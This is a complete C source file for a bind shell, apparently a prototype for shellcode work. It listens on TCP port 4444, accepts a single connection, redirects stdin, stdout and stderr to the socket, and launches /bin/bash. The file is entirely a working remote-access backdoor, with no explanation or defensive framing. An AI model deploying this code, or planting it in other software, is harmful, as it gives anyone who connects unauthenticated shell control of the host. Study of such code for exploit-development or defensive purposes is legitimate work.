#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 4444

void error(char *message) {
	perror(message);
	exit(1);
}

int main(int argc, char *argv, char **envp) {
	// (above) IPPROTO_IP = 0; IPPROTO_TCP = 6;
	int sockfd, new_sockfd;
	if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)) == -1) {
		error("Unable to open socket");
	} else {
		printf("Created socket (fd = %d)\n", sockfd);
	}

	int level = 1;
	if (setsockopt(sockfd, SOL_SOCKET,
			SO_REUSEADDR, &level, sizeof(int)) == -1) {
		error("Unable to set socket options");
	}

	struct sockaddr_in serv_addr, client_addr;
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(PORT);
	serv_addr.sin_addr.s_addr =  0;

	if (bind(sockfd, (struct sockaddr *) &serv_addr,
			sizeof(serv_addr)) == -1) {
		error("Unable to bind to socket");
	} else {
		printf("Bound to socket (fd = %d)\n", sockfd);
	}

	char *serv_ip = inet_ntoa(serv_addr.sin_addr);
	int serv_port = ntohs(serv_addr.sin_port);
	printf("Listening on %s:%d\n", serv_ip, serv_port);
	listen(sockfd, 1);

	int sin_size = sizeof(struct sockaddr_in);
	if ((new_sockfd = accept(sockfd, (struct sockaddr *) &client_addr,
			&sin_size)) == -1) {
		error("Error occured during call to accept()");
	} else {
		char *client_ip = inet_ntoa(client_addr.sin_addr);
		int client_port = client_addr.sin_port;
		printf("Accepted connection from %s:%d\n", client_ip, client_port);

		// Duplicate stdin/stdout/stderr to new socket
		for (int i = 0; i <= 2; i++) {
			dup2(new_sockfd, i);
		}

		execve("/bin/bash", NULL, NULL);

		close(new_sockfd);
	}

	close(sockfd);
}
